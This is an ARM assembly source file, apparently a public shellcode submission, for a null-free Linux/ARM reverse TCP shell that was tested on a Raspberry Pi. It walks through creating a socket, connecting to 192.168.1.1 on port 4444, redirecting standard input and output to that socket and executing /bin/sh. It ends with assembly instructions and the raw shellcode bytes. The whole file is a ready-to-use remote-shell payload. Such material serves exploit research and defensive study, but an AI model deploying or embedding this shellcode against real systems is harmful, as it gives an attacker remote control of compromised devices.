/*
* Title:  Linux/ARM - Reverse Shell TCP (/bin/sh). Null free shellcode (80 bytes)
* Date:   2018-01-25
* Tested: armv7l (Raspberry Pi v3)
* Author: rtmcx - twitter: @rtmcx
*/

.section .text

.global _start

_start:
/* Enter Thumb mode */
	.ARM
	add	r3, pc, #1
	bx	r3


	.THUMB

/* Create a new socket*/
	mov		r0, #2				// PF_INET = 2
	mov		r1, #1				// SOCK_STREAM = 1
	eor		r2, r2, r2			// Zero out r2
	mov 	r7, #100			// Put 281 in r7..
	add		r7, #181			// ..in a 2-step operation
	svc		#1					// syscall returns sockid in r0

	mov		r4, r0				// Save sockid in r4


/* Connect to client */
	adr 	r1, struct_addr		// Address to struct_addr
	strb	r2, [r1, #1]		// Replace AF_INET with NULL
	mov 	r2, #16				// Address length
	add 	r7, #2				// r7 already contains 281, so add 2 = 283
	svc 	#1					// Client sockid will be returned in r0


/* Duplicate STDIN, STDOUT and STERR */
	mov 	r0, r4				// Saved sockid
	eor 	r1, r1, r1			// Zero r1 for STDIN
	mov		r7, #63				// Syscall for dup2
	svc 	#1					// Execute syscall

	mov 	r0, r4				// Saved sockid
	add 	r1, #1				// STDOUT (1)
	svc		#1					// Execute syscall

	mov 	r0, r4				// Saved sockid
	add 	r1, #1				// STDERR (2)
	svc		#1					// Execute syscall


/* Execute shell */
	adr 	r0, shellcode		// Address to "/bin/sh"
	eor		r1, r1, r1			// Zero out r1
	eor		r2, r2, r2			// And r2
	strb	r2, [r0, #7]		// Replace 'X' with NULL
	mov		r7, #11				// Syscall for execve
	svc 	#1					// Execute syscall


struct_addr:
	.ascii "\x02\xaa"			// AF_INET 0xff will be NULLed
	.ascii "\x11\x5c"			// port 4444
	.ascii "\xc0\xa8\x01\x01" 	// IP Address (192.168.1.1)

shellcode:
	.ascii "/bin/shX"

/*
Compile and link with:
# as -o shellcode.o shellcode.s
# ld -N shellcode.o -o shellcode

\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x04\x1c\x0a\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x20\x1c\x49\x40\x3f\x27\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x04\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x02\xff\x11\x5c\xc0\xa8\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58
*/